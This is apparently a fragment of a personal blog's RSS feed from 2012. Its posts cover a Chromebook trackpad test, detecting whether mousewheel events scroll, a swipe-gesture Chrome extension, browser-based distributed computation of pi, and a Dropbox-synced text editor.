      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/experiments/swipe-gesture/responsive.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Etch-A-Sketch%20on%20a%20Trackpad/Screenshot-2012-08-14-at-4.24.07-PM-e1344979996149-1024x605.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot 2012-08-14 at 4.24.07 PM&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I was testing the responsiveness of the Samsung Series 5 Chromebook touchpad and made a short little script which basically continuously adds the mousewheel changes and draws them using canvas. But it appears that the trackpad does some kind of fitting to make things tend to be at right angles, though it’s not hard to get something diagonal or even somewhat circular.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/experiments/swipe-gesture/responsive.html&quot;&gt;http://antimatter15.com/misc/experiments/swipe-gesture/responsive.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Determining if a Mousewheel Event Results in Scroll</title>
      <link>http://antimatter15.com/2012/08/determining-if-a-mousewheel-event-results-in-scroll/</link>
      <pubDate>Mon, 13  Aug 2012 23:14:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/determining-if-a-mousewheel-event-results-in-scroll/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Determining%20if%20a%20Mousewheel%20Event%20Results%20in%20Scroll/nuUgy.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Determining%20if%20a%20Mousewheel%20Event%20Results%20in%20Scroll/nuUgy.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;nuUgy&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So here’s a somewhat technical post, actually it’s pretty technical. But either way the premise is sort of simple to understand, and probably so is the context. I’m working on Swipe Gesture 2.0, which basically tries to take Chrome and Safari on OS X Lion’s awesome back-forward transitions and make them work on other operating systems. See, the thing is that multitouch isn’t _strictly _a requirement for it to work, a lot of computers just have the little bars on the bottom and right of the track bar (often with a little somewhat abrasive textured surface so you don’t accidentally tread upon it). Regardless, the title is a bit of a misnomer, because even though the event is called the “mousewheel”, it’s hardly meant to be observed from an actual mouse (or a wheel), instead it means the scrolling gesture on some kind of trackpad, either multitouch or not.&lt;/p&gt;
&lt;p&gt;Well, first, I guess I’ll talk about the difference between how Lion and Leopard do it. The way Leopard did it was pretty cool but not particularly applicable to other platforms since it relied on the existence of a three-finger gesture. As in, you needed some kind of touchpad which was cool enough to support three-finger multiouch, &lt;em&gt;reliably&lt;/em&gt;. It also behaved completely independent of the current zoom or scroll position, which makes implementation in software entirely trivial given access to some drivers which can recognize three fingers on a touchpad.&lt;/p&gt;
&lt;p&gt;Lion did it a completely different way. Instead of creating an entirely new gesture which was entirely dedicated to the singular task of navigating through history, it conflated the notions of scrolling with navigating, which sort of makes sense. Apple’s quite dedicated to skeuomorphic metaphors, and they want to treat the web more like &lt;em&gt;literal pages&lt;/em&gt;. A user can move it around to better keep certain things in view, and the physical movement to slide a sheet out of view is just an extension of that panning gesture.&lt;/p&gt;
&lt;p&gt;However, technically this poses a completely different challenge, because this requires you to distinguish between scrolls and navigation requests. Scrolling is always the default behavior, but the navigation swipe gesture happens when scrolling wouldn’t actually result in anything. However, many implementations of scrolling are at least somewhat kinetic, often it’s emphasized in software (in the form of smooth-scrolling) or hardware (scroll wheels that don’t click but instead move basically freely) or because your arm has to obey the laws of kinematics (unless it doesn’t, in which case that’s certainly fascinating). So not only does the software have to determine when a mouse wheel action results manifests as a scroll, it has to see if it was the user’s intent to do the extraneous scrolling.&lt;/p&gt;
&lt;p&gt;This is done by clustering the mouse wheel movements together temporally. Scroll events flow in in discrete chunks, and you can split events off into little buckets (in a sense), where if there isn’t any event sent within some arbitrary threshold (say, 500msecs or half a second), you stick stuff in a new bucket. This way, lets say you scroll from the top of the page to the bottom and you’re sort of excited, and spin the wheel as fast as possible, you hit the bottom of the page but it’s not some instant stop. You continue scrolling (because you’re just that excited, and just can’t stop) for a little bit more. Ignoring the fact that you probably won’t have a vertical/horizontal event handler (though there are some sort of intriguing possibilities for this, one idea is to have the upper threshold trigger full screen). Without segmenting them into certain buckets, it doesn’t recognize that the time when you’re ramming into the top of the page is part of the same general gesture as when you were scrolling, and it may interpret that as an intentional gesture. So that’s one part which makes it a bit more complex.&lt;/p&gt;
&lt;p&gt;So now, you have these series of &lt;code&gt;mousewheel&lt;/code&gt; events conveniently delimited into little gesture-chunks. The next part is determining whether or not the gesture-chunks are part of a scroll action or not.&lt;/p&gt;
&lt;p&gt;Thankfully that’s a really simple thing to do. Just look at the document’s scrollTop and check if it’s zero (or scrollLeft for horizontal stuff) or whatever value is the width of the element. If it can’t scroll no more, then you have a winner and you can start the falling balloons and confetti.&lt;/p&gt;
&lt;p&gt;Except it’s not that easy, because the document isn’t the only thing which can scroll. Thanks to the glory of &lt;code&gt;overflow:scroll&lt;/code&gt;, there are lots of things which can scroll. Things which aren’t necessarily documents may be in arbitrary scroll positions to wreak havoc on your well-meaning heuristics.&lt;/p&gt;
&lt;p&gt;So back to the drawing board, I guess. Actually, to think of it, maybe it’s simpler to listen for the &lt;code&gt;scroll&lt;/code&gt; event, which fires when a scroll happens, and quite intuitively doesn’t fire when a scroll doesn’t happen. And mouse wheel actions always precede scroll ones (because the wheel events bubble and are cancelable, so you can prevent a scroll from happening). The only problem is that scroll events don’t bubble. As in, when a scroll event happens on some element, it’s not going to show up on the document, it’s only going to show up if you’re listening on that specific element at the right point in time.&lt;/p&gt;
&lt;p&gt;The naive approach to this dilemma is just to attach a scroll listener to every single event on the document, and to reattach to some other elements whenever the DOM tree is modified in some way. This means the overhead grows rather significantly when pages are larger, in a way which could be likened to O(n) time where n represents the number of nodes in the document. If you want, you could lazily do it by attaching the scroll listener only once the wheel event has fired, but that would cause a significant delay when attempting to legitimately scroll.&lt;/p&gt;
&lt;p&gt;Another thing you could do, is to make another assumption: that the element which gets scrolled has to be some parent of the element which the mouse is currently over. Making that assumption, we can add a &lt;code&gt;mousewheel&lt;/code&gt; listener to the root of the document, as those kinds of events actually do bubble. And since they’re mouse events, once you capture it, you can get a &lt;code&gt;clientX&lt;/code&gt; and &lt;code&gt;clientY&lt;/code&gt;, comprising the current coordinates of the mouse. And with that, you can get the element immediately below the cursor with &lt;code&gt;document.elementFromPoint&lt;/code&gt;. And since the scroll might fire on any one of the elements which are parents of the current element, you ascend up the tree and add a listener on all of those (until, of course you hit the document element, at which point you can’t go any further up). This yields performance which could essentially be modeled with O(log n), quite a bit better than O(n).&lt;/p&gt;
&lt;p&gt;So now the finished process is fairly simple, you listen for a mousewheel event, and when it happens we determine the element, and ascend the tree, yada yada. That scroll listener, when fired, sets a global variable &lt;code&gt;lastDetectedScroll&lt;/code&gt; to the current timestamp. We set a little temporary variable set to the before time and then we set a little timer, 150 milliseconds. It usually only takes like four to see if a scroll thingy happened, but let’s be safe by having an order-of-magnitude threshold. The Cuckoo clock rings, and we check if the &lt;code&gt;lastDetectedScroll&lt;/code&gt; is the same thing, and if it is, it’s a swipe, and otherwise, it’s a scroll.&lt;/p&gt;
&lt;p&gt;Here’s a little demo: &lt;a href=&quot;http://antimatter15.com/misc/experiments/swipe-gesture/minimal.html&quot;&gt;http://antimatter15.com/misc/experiments/swipe-gesture/minimal.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Swipe Gesture for Chrome</title>
      <link>http://antimatter15.com/2012/08/swipe-gesture-for-chrome/</link>
      <pubDate>Mon, 13  Aug 2012 07:23:18 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/swipe-gesture-for-chrome/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Swipe%20Gesture%20for%20Chrome/unnamed.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Swipe%20Gesture%20for%20Chrome/unnamed-300x187.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;unnamed&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here’s an extension which I actually released&lt;a href=&quot;https://plus.google.com/116347431032639424492/posts/K4xgL8SKKQU&quot;&gt; some time back&lt;/a&gt;, but never got around to writing a blog post for. Part of the reason was that the early reviews didn’t quite pan out, in large part due to &lt;em&gt;not working&lt;/em&gt;. But I was using my Chromebook and I somehow felt a vague longing for some kind of multitouch gesture, and remembered that I had made this little extension (which I had disabled for some reason). Anyway, this is as appropriate a time as any to formally announce it to my probably remarkably small blog readership.&lt;/p&gt;
&lt;p&gt;There is, however a tad bit of difficulty representing the function of it in pictures because really, it doesn’t have a big UI. It makes hardware more useful, and in its idealized form, should have no interface. But of course, we don’t live in a place where apps are perfectly idealized and either way, Apple has &lt;a href=&quot;http://www.apple.com/osx/what-is/gestures.html&quot;&gt;plenty of nice pretty pictures&lt;/a&gt; of people swiping fingers to the right.&lt;/p&gt;
&lt;p&gt;I really fell in love with the Macbook multitouch gestures, almost at first sight. They just seemed so natural and so beautiful that I sort of felt that that was like the epitome of design or HCI perfection. And from that point, any time I used a laptop which wasn’t made by Apple (or even the ones which were made by Apple but were stuck in the barbaric ages preceding the inclusion of the glass multitouch pad, where its invention might have produced a &lt;a href=&quot;http://en.wikipedia.org/wiki/File:Creaci%C3%B3n_de_Ad%C3%A1n.jpg&quot;&gt;scene like this&lt;/a&gt;), I felt thoroughly disgusted.&lt;/p&gt;
&lt;p&gt;Flipping through the Chromium OS design papers, there is one page dedicated specifically to&lt;a href=&quot;http://dev.chromium.org/user-experience/multitouch&quot;&gt; cool multitouch gestures&lt;/a&gt; which could be used. And as far as I’m aware the Samsung Series 5 550 (the new chromebook) is the only device which supports these gestures (thus far), and even then it’s only pinch to zoom and forward/back (three finger). All the other Chromebook users have been left out.&lt;/p&gt;
&lt;p&gt;Another cool thing about the implementation is that it uses a certain &lt;code&gt;webkitDirectionInvertedFromDevice&lt;/code&gt; property of the &lt;code&gt;mousewheel&lt;/code&gt; events, which gives you a boolean value about whether or not the platform you’re on has some magical direction inversion like on OS X Lion or if you’ve enabled “simple scrolling” on Chrome OS. But this might not have been a good idea since swipe directions too are sort of inverted on those platforms naturally as well, so it might be better to _not _compensate for it.&lt;/p&gt;
&lt;p&gt;Anyway, the implementation is actually quite simple. The current version doesn’t even break the 40 line mark, because all it does it it listens for &lt;code&gt;mousewheel&lt;/code&gt; events on every page (via a content script), and it calculates the current acceleration. If that acceleration ever passes a certain threshold, it triggers a forward or back action. Right now, the threshold is preconfigured based on my own testing on a Samsung Series 5 (note, not 550) chromebook. But for people with other devices, I’m working on a second version which will be slightly more Apple-esque in its implementation.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Distributed Pi Revisited</title>
      <link>http://antimatter15.com/2012/08/distributed-pi-revisited/</link>
      <pubDate>Sat, 11  Aug 2012 06:43:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/distributed-pi-revisited/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Distributed%20Pi%20Revisited/Screenshot-from-2012-08-11-223733.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Distributed%20Pi%20Revisited/Screenshot-from-2012-08-11-223733-150x150.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot from 2012-08-11 22:37:33&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I’ve been interested in distributed computing for some time, since 2007, basically around the time I started doing web development. I’ve always sort of romanticized the notion of distributed computing because of its vast theoretical potential. Projects like &lt;a href=&quot;http://boinc.berkeley.edu/&quot;&gt;BOINC&lt;/a&gt;, &lt;a href=&quot;http://setiathome.berkeley.edu/&quot;&gt;SETI@Home&lt;/a&gt; and &lt;a href=&quot;http://folding.stanford.edu/English/HomePage&quot;&gt;Folding@Home&lt;/a&gt; have always given me some kind of idealized notion of “computing for good”, inspiring some kind of useful social, scientific or otherwise beneficial change to humanity. But those projects never got the kind of adoption which could truly change the world, together they form networks which are specialized but can, in the end, only eke relatively minute performance.&lt;/p&gt;
&lt;p&gt;Part of the problem lies in their intrinsic forbidding voluntary nature. It takes too much effort to install and amplifies the problems intrinsic to any “democratic” system: why bother? Voter apathy often stems from a feeling that an individual contribution regresses towards nothing, which is statistically certainly true, but never helpful if it plays a part in the participation of one of these collective entities.&lt;/p&gt;
&lt;p&gt;In a broader sense, I’ve always suspected that part of what is necessary for technological progress is the loss of control. Certainly something which appears true from a human experience, that the vast arrays of neurons bound by a cranium are uninviting and wholly unwilling to expose their inner raw computation power to the emergent conscience within them. No doubt the human brain is good at computing, just not (as it appears) math, but intuition (especially of the physical kind) can only arise when a system internalizes some very complex math. We just can’t access it, because evolution or some other process has determined that it was something that had to be done away with on the climb to higher cognitive powers.&lt;/p&gt;
&lt;p&gt;Likewise, I think computers are convergent in that sort of way. There’s a great ladder of abstraction which is growing taller and taller, a tower of babel of sorts, and at the end, perhaps we’ll find a similar goal, maybe not of god per se, but an equally sought target of consciousness or some other high level intellectual faculties contemporaneously denied to computers.&lt;/p&gt;
&lt;p&gt;Part of this is losing control, which is inevitable and politically dangerous. Computing terminals are powerful and capable of much more than they’re being used for. In fact, most computers spend most time idling, the processors get ever faster not for the handling of the idle time but in order to smooth out the few bursts that actually require fast computation.&lt;/p&gt;
&lt;p&gt;It’s impractical for operating systems to build into them some kind of distributed computing platform, however ideal that would be. It’s too contentious to ever get adopted, conceptually a short step away from the ability for a mega-corp to pilfer your precious information as well.&lt;/p&gt;
&lt;p&gt;But the browser, specifically the web, provides us with an interesting opportunity. Here, we have significantly less fear of personal privacy, since it comes with an expectation of sorts for information sharing. The existence of client side scripting and its prevalence gives an implicit permission to exploit system resources during the site’s tenure.&lt;/p&gt;
&lt;p&gt;Now, of these granted permissions, we have the freedom now to exploit in order to create something truly remarkable. Because it’s not so much voluntary on the part of the user, so much as voluntary on the part of the site maintainer who now has the responsibility of allocating and managing the system resources of his visitors, for their brief but additive virtual encounters. The users lose control, and that’s a good thing.&lt;/p&gt;
&lt;h2 id=&quot;old-stuff&quot;&gt;Old Stuff&lt;/h2&gt;
&lt;p&gt;When I first wrote that introduction, I mentioned that I was interested in distributed computing for &lt;a href=&quot;http://antimatter15.com/wp/2007/10/ajax-distributed-computing/&quot;&gt;quite a while&lt;/a&gt;, and that’s true. 2007 was, at time of writing five years ago. A bit less than a third of my life, which is fairly significant. It doesn’t even quite belong to recent memory, and perhaps has escaped living memory into something quasi-zomboid. Part of the reason why this section is relatively short compared to the other ones is because I really don’t have a very good memory of what that was like, and it’s rather sad that my previous attempts never had long writeups regarding their potential and process (however, there do tend to be more little updates about the process).&lt;/p&gt;
&lt;p&gt;Anyway, as it’s been such a long time, I’m trying to dig through old stuff to pick out exactly what I did back then. The first things I can find are somewhat easier and simpler problems, finding palindromes, or at least words which spell different words when reversed (I believe this was based on a program I had written a few years prior in Visual Basic). Another was for cracking hashes in a distributed manner.&lt;/p&gt;
&lt;p&gt;Back then, I think those were one of the first explorations into the concept, of distributed computing in the browser. It was the days before WebWorkers and Cross-Origin Resource Sharing was in its infancy. The pool of possible computation was however, still large but most of it was forbidden. Take note, however that distributed and parallel computing have existed for far longer, perhaps even longer than the idea of a computer.&lt;/p&gt;
&lt;p&gt;Computers get faster each year, thanks to &lt;a href=&quot;http://en.wikipedia.org/wiki/Moore%27s_law&quot;&gt;Moore’s Law&lt;/a&gt; and more and more people get connected to the Internet each year. Perhaps in addition to &lt;a href=&quot;http://en.wikipedia.org/wiki/Metcalfe%27s_law&quot;&gt;Metcalfe’s law&lt;/a&gt; with regard to the value of a telecommunication’s network, is the ability to harness idle computation power in order to increase the vale of its participants linearly as the network grows. There are almost a billion people who are connected to the Internet, and however insignificant of a contribution each of those terminals brings to the network would add up into something truly remarkable.&lt;/p&gt;
&lt;p&gt;However, hash cracking and palindrome finding are fairly trivial. They have little real world practicality and don’t seem in any way representative of the greater problems facing humanity. While it’s a little impractical to aim for some kind of project which has immediate applications to the value of humanity, it’s certainly a worthy target which is worth approximating. They’re isolated examples which are easy to parallelize and hardly count as real ventures into the field.&lt;/p&gt;
&lt;p&gt;Calculating digits of pi is marginally less useless and represents something which is significantly harder and tasks which may be closer to the kinds of computations which are performed in the real world. There have been other projects with similar goals, most notably, &lt;a href=&quot;http://en.wikipedia.org/wiki/PiHex&quot;&gt;PiHex&lt;/a&gt;, which acts as a sort of vindication of this as a possible legitimate attempt. At this point, I have no idea if the algorithm works with digits in the order of trillions, and that’s one of the big reasons I’m not actually trying to succeed PiHex.&lt;/p&gt;
&lt;h2 id=&quot;revisting&quot;&gt;Revisting&lt;/h2&gt;
&lt;p&gt;Okay, so I decided to dig this up again.&lt;/p&gt;
&lt;p&gt;Why? Because I really want to play around with server-side JS a little more (just in case getting a node vps has anything to do with merit). The sort of funny thing is that’s exactly what it used to be, back in the ancient past, before NodeJS existed (it was before Google Chrome was released, and V8 wasn’t open source). I used to have an application which would schedule jobs for computation on the client and provide them in a more useful format.&lt;/p&gt;
&lt;p&gt;However, I never bothered saving the files outside of the &lt;a href=&quot;http://en.wikipedia.org/wiki/AppJet&quot;&gt;AppJet&lt;/a&gt; web IDE and the code was lost when the service was discontinued. I tried porting to Google App Engine, but that version was plagued with strange bugs which ended up printing out the wrong digits after a few thousand were computed.&lt;/p&gt;
&lt;p&gt;Right now, revisiting the idea, I’ve added a few things which are somewhat more characteristic of the change in web browsers since my first attempt. The old version tried to mock threading by the liberal application of &lt;code&gt;setTimeout&lt;/code&gt;, which meant that most interface interaction wouldn’t be terribly affected. However, it did incur a noticeable slowdown. Now, it uses WebWorkers, which provides numerous interesting possibilities. First and perhaps most important is context isolation and lightweight, asynchronous embedding in multiple domains (origins). Since WebWorkers can work (see what I did there?) across multiple origins and still have access to &lt;code&gt;XMLHttpRequest&lt;/code&gt;, and the advent of Cross-Origin Resource Sharing (CORS), it’s easy to embed this in a page. The low embedding overhead and the true multi-threading abilities bring a lot in the way of making this more than an intriguing concept and into something much more practical.&lt;/p&gt;
&lt;p&gt;The code, which is now on the &lt;a href=&quot;https://github.com/antimatter15/distributed-pi&quot;&gt;Github repository&lt;/a&gt; in a new folder named &lt;code&gt;node&lt;/code&gt; has a very basic interface. Rather than manipulating the widths of divs for progress indicators, now it uses &lt;code&gt;&amp;amp;lt;progress&amp;amp;gt;&lt;/code&gt; (it’s actually really cool to see how far the state of web platform’s state of affairs has changed over the past few years). One cool thing about the progress bar is that it guesses progress by dividing the current prime number by the end point, which has an interesting effect of making the progress bar faster towards the end (this happens because the &lt;a href=&quot;http://en.wikipedia.org/wiki/Prime_number_theorem#History_of_the_asymptotic_law_of_distribution_of_prime_numbers_and_its_proof&quot;&gt;distribution of prime numbers asymptotically declines&lt;/a&gt;). While I could possibly invert the effect in order to create a more linear progression fairly trivially, behavioral studies indicate that people who stare at progress bars all day feel less irritated (i.e. more satisfied) when the bar speeds up in the beginning and end (then again, the progress indicator isn’t really meant to be shown to people and if it is, the user experience is hardly something which is being optimized for, and this does nothing in the way of speeding up the beginning, in fact it’s quite the opposite by slowing down the beginning, so perhaps it should first linearize the progress and then map it to some function which as accelerated starts and ends, perhaps some trigonometric function).&lt;/p&gt;
&lt;p&gt;Part of what is cool about the project is the underlying algorithm, a port of &lt;a href=&quot;http://en.wikipedia.org/wiki/Bellard%27s_formula&quot;&gt;Fabrice Bellard’s&lt;/a&gt; optimized version of the &lt;a href=&quot;http://en.wikipedia.org/wiki/Bailey%E2%80%93Borwein%E2%80%93Plouffe_formula&quot;&gt;Bailey–Borwein–Plouffe algorithm&lt;/a&gt;. Unique to the algorithm is that it uses up comparably little memory and as such it’s uniquely suited to distributed computing, especially in the browser environment which demands relatively thin clients (however, browser caching means that the download would only necessarily need to be completed once, and embedding the computation in an &lt;code&gt;iframe&lt;/code&gt; with certain storage permissions and appCache could allow persistence). It’s a relatively short algorithm and fairly easy to port.&lt;/p&gt;
&lt;p&gt;However, as it’s a digit extraction algorithm, it’s not very efficient for calculating digits sequentially. That actually is something of a feature which I neglected in the so-called modern incarnation. Older versions had the prime number (sub-job) allocation done on the server, which meant using up a lot of memory in keeping track of the jobs. The current one has a server which is entirely unaware of the actual computational process, which leads to being lighter persistence-wise but comes at the obvious cost of losing granularity in scheduling.&lt;/p&gt;
&lt;p&gt;One optimization about this strategy is that a client doesn’t have to wait for a server to respond with another job request in order to continue. Instead, it operates in an almost completely asynchronous manner. On the client’s first request, the server gives it a job which is given by a starting point (a prime number to continue from) and a digit number. From that point, the client begins computing until that digit is complete, sending its progress back to the server once in every specified interval (a couple of seconds).&lt;/p&gt;
&lt;p&gt;If the client was to disconnect in the middle of a computation (which can take quite some time, especially in later digits, so its more than certain to happen), the server will be able to resume the calculation by sending the request to another client after a certain expiration date has passed. So future refinements to the server (and possibly the client) could make it more efficient with processing digits of less significance by allocating jobs and taking into account certain checkpoints. For instance, all the prime numbers between 3 and some integer N have to be iterated through (where N is approximately 3 times the number of digits from the radix). Rather than maintaining a “single-threaded” system (as it currently does, the parallel processing power comes from sending out multiple digit segments to be processed), it could instead send out simultaneous requests for different segments. The client may have to be modified in order to stop at certain designated checkpoints to prevent clients from overlapping.&lt;/p&gt;
&lt;p&gt;This sort of scheme would be more efficient than storing jobs used in previous versions, first of all by retaining the sort of “dumb” server which doesn’t do any real computation that contributes to the process. Instead it only acts as a mediator and persistence layer (as perhaps is the best role to give to any server). Rather than keeping track of every single prime number as a different row in some database, the server would only need to keep track of as many sections as clients exist.&lt;/p&gt;
&lt;p&gt;The new version also has some interesting changes. First is the switch to &lt;a href=&quot;http://nodejs.org/&quot;&gt;NodeJS&lt;/a&gt;, which was hinted at before, since it acts as a persistent server rather than something which is called and disposed like a CGI process, the queuing system is now entirely in-memory. However, as soon as its possible, it writes out the completed digits into a file (&lt;code&gt;pi.txt&lt;/code&gt;), and if the server is ever interrupted the computations resume from the last saved version of the digits (only the jobs which were processing during the shutdown are lost). However, this would need to be changed if it were to be some more ideal use of the digit extraction method, since in such a situation, the vast majority of jobs would be for a single span of digits (and it would really suck to lose all of those).&lt;/p&gt;
&lt;p&gt;So in a sense, this update constitutes a regression, a step in the wrong direction in that it’s using the algorithm wrong. However, in another sense, it paves the way to a set up which has a few more ideal properties, a lighter weight server end and a more efficient use of computation time on the part of the clients. In essence, the shift from fixed sized discrete computational tasks (or jobs) to mere ranges. The obvious benefit to the latter is the reduced memory demand and the ability to operate continuously, i.e. without pausing for acquiring tasks and behaving truly asynchronously (in a very Node.JS style). Perhaps taking it further along this direction (since WebWorkers are allowed to access applicationCache), clients could be given a starting point and are just let to rip through a few hundred cycles, synchronizing less frequently. Some specialized data structures might be employed to keep track of individual contributions so that the ranges are doled out optimally. Maybe this should instead evolve into some kind of successor to the PiHex project rather than some incredibly slow and inefficient sequential pi calculation platform.&lt;/p&gt;
&lt;p&gt;One thing which I didn’t explore was the concept of having a persistent socket to the server. For this set of circumstances, the benefits of maintaining a persistent bidirectional socket weren’t large enough to warrant that kind of development. Right now, it’s communicating through a few small GET requests to a server. Part of the reason GET was used rather than POST was that it was designed with the idea that it could theoretically run in a cross-domain manner, and sending a POST request requires preflighting with CORS headers. Since it’s only ever really sending 30 or so bytes at a time, any additional overhead should be avoided. But this itself is also perhaps an argument for using WebSockets (though certainly not long-polling, since that incurs even more overhead). Quite often the synchronization requests don’t require the server to give anything back, but HTTP-wise, the server’s always going to have to send about a hundred bytes of headers to fulfill the HTTP requirements. Also, whenever the server sends a request, it wastes about a third of a kilobyte with header information like the User-Agent. Network-wise it might in the end be more efficient just to have a low-overhead persistent socket connection.&lt;/p&gt;
&lt;p&gt;Having a persistent socket would make synchronization interesting as well. While the changes wouldn’t be terribly drastic since there’s still the goal of minimizing transmission overhead, a few changes to the scheduling could be conveyed without necessarily waiting to the next checkpoint. And of course, there’s the trade-off which comes with the question of how long the checkpoints should be spaced. Right now, it’s something fairly low in the range of 10 seconds since the duration of a single page visit usually isn’t much more than a few seconds. However, if a client-side persistence layer is added, the checkpoints could be spaced out much wider. Perhaps instead of every few seconds, one could be made for every minute, hour, day or even week. Where a single computational task allocation could span multiple domains, multiple days and while the user is online and offline. However, having wider-spaced checkpoints does incur a cost in terms of synchronization. It reduces the operator’s sense of intimate awareness of what’s actually happening and increases the chance of overlaps.&lt;/p&gt;
&lt;p&gt;Another possible step is some kind of framework which handles all of these problems automatically. Instead of having to manually manage variables and the synchronization of tasks between clients and servers, one could construct a domain specific language for distributed computing (a superset or subset of javascript which automatically manages the state of variables in loops and such to compile into some kind of client for generic parallelized algorithms). Maybe it’ll do something cool and look at which loop is the optimal one to split up based on the amount of data which needs to be sent across so that it could be minimized.&lt;/p&gt;
&lt;p&gt;One of the things I played with while revisiting this project was playing with LLJS, another kind of specialized language which builds upon Javascript. As it’s marketed, the “bastard child of Javascript and C”, which manually manages memory. I was hoping that using a typed language might bring some speed improvements (not really, in this situation). However, LLJS might be a good basis for this auto-magical compiler for synchronous routines into largely parallelized code. However, maybe there are in fact limits to parallel computing, and it’s better to search for specific algorithms which have the right properties. And maybe in the end, the problem of porting it to Javascript and managing the client-server communication fades into a relative triviality.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>CloudFall: A Text Editor</title>
      <link>http://antimatter15.com/2012/07/cloudfall-a-text-editor/</link>
      <pubDate>Fri, 06 Jul 2012 08:20:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/07/cloudfall-a-text-editor/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://github.com/antimatter15/cloudfall&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/CloudFall%20A%20Text%20Editor/Screenshot-from-2012-07-06-090534.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot from 2012-07-06 09:05:34&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is probably a horrible time to think of writing an online text editor. The “market”, if you can call it that, is virtually saturated with worthy contenders and (figuratively) every day is marked by the entrance of some other text editor to the already crowded space. Part of the problem is that now, web based text editing components are actually pretty awesome. Ace and CodeMirror work really quite well and each have associated with them some very formidable integrated development environments, referring to Cloud9 and LightTable, respectively (albeit there are quite a few others, these seem to be probably the most funded). And at Google I/O 2012, they announced the new Chrome Packaged Apps, which expose new functionality (most relevant being the ability to open and save files from the local disk and operating offline by default), and their sample apps include no less than two text editors.&lt;/p&gt;
&lt;p&gt;Nevertheless, I’ve always pined (probably an exaggeration) for the opportunity to indulge in something as meta as writing a text editor which I could use as a text editor for the text editor (which is, if you did not notice, that text editor). It’s probably the pinnacle of dogfooding (probably nice coming after a streak of making extensions that I never actually use). But this doesn’t really go anywhere in terms of explaining why I’m doing this rather than using someone else’s rather better developed text editor package. It really comes down to this chrome app which I was quite a fan of almost a year ago, called SourceKit. SourceKit is a text editor which runs in Chrome that synced with Dropbox. The version which was distributed on the Chrome Web Store never supported offline, which is sort of sad because that’s the one feature I really wanted. The other source of inspiration was Streamie, the real time node based twitter client which had an absolutely phenomenal scheme for contributing. You just needed to fork the repo on github and all your commits would be visible live on your own subdomain of the site.&lt;/p&gt;
&lt;p&gt;Also, in the mean time, I had discovered this pretty awesome text editor (no, it’s not VI or Emacs, because I’m not nearly cool enough or dedicated enough to approach that steep precipice of a learning curve) called Sublime Text 2. I have a pretty good picture now of what exactly I want from a text editor based on that (actually, I don’t know if this is just some delusion which has manifested in my mind because I probably thought the same way about gedit and krita and komodo and aptana and notepad2 and notepad++ and dreamweaver before that).&lt;/p&gt;
&lt;p&gt;The real drive to creating that text editor happened in the week before I was scheduled to attend Google I/O 2012. I knew I’d be in some situations lacking Internet, and I felt like writing words or code or something in that time. So in a few days I hacked together this text editor which had a vague resemblance to Sublime Text. It was based on Ace, like SourceKit before it, but obviously a newer version with a whole bunch of syntax and themes included. It used a modified version of the Dropbox component from SourceKit (it was changed moderately to accommodate Dropbox API 2.0 and to deal with binary things like array buffers and blobs). And I added a little heads-up-menu-esque file and command picker, quite reminiscent of Sublime Text (and to a lesser extent Ubuntu Unity).&lt;/p&gt;
&lt;p&gt;And then I headed for the airplane having not actually used it much in practice hoping to be super productive while using it, which you could have probably been able to tell by the beginning of this sentence wouldn’t pan out. The first (quite major) flaw which I encountered was some bug which would end up wiping out any file that I tried to edit, and left me with a gaping chasm in my hard drive (this is a metaphor, because my Chromebook is solid state). I just hope nothing of value was lost, but it remains quite likely that it was the otherwise.&lt;/p&gt;
&lt;p&gt;I had no real system for testing out changes to my own extension, and I was too paralyzed of the fear of deleting my own extension to try changing it. So the end result was that the entire duration passed with me hardly doing anything productive on the project, or using it for any productive means in itself. All that happened was my discovery that everyone is working on a text editor right now and I should probably quit right then and there and work on something perhaps more novel or productive. But I came back and fixed it and did some more on it, and I’m finally at the point at which I feel comfortable using it for some mostly useless things, like writing a blog post inside the project’s readme about the project itself.&lt;/p&gt;
